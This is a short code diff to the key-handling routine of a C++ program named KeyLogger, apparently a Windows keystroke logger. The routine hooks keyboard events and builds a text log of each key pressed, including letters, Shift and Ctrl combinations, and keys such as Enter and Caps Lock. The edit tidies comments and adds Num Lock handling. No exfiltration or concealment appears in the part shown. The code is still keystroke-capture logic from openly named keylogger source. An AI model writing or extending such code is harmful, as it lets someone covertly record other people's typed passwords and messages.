@@ -27,14 +27,12 @@ LRESULT CALLBACK KeyLogger::startListen(int nCode, WPARAM wParam, LPARAM lParam)
 		}
 		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) // key is pressed
 		{
-			// cout << hex << in;
-			// /*
 			if (code == VK_LSHIFT || code == VK_RSHIFT) { isShiftOn = true; }
 			if (isCtrlOn == true && code != VK_LCONTROL && code != VK_RCONTROL) { key_event += "<CTRL+"; }
 			if (code == VK_LCONTROL || code == VK_RCONTROL) { isCtrlOn = true; }
 
 
-			//A-Z: WORKING
+			//A-Z:
 			if (65 <= code && code <= 90)
 			{
 				cur_char = code;
@@ -46,7 +44,7 @@ LRESULT CALLBACK KeyLogger::startListen(int nCode, WPARAM wParam, LPARAM lParam)
 				else key_event += cur_char;
 			}
 
-			//Speical chars WORKING
+			//Speical chars
 			switch (code)
 			{
 			case VK_BACK:
@@ -120,6 +118,9 @@ LRESULT CALLBACK KeyLogger::startListen(int nCode, WPARAM wParam, LPARAM lParam)
 				break;
 			case VK_RETURN:
 				key_event += "<enter>";
+				break;
+			case VK_NUMLOCK:
+				key_event += "<num-lock>";
 				break;
 			case VK_CAPITAL:
 				key_event += "<caps>";
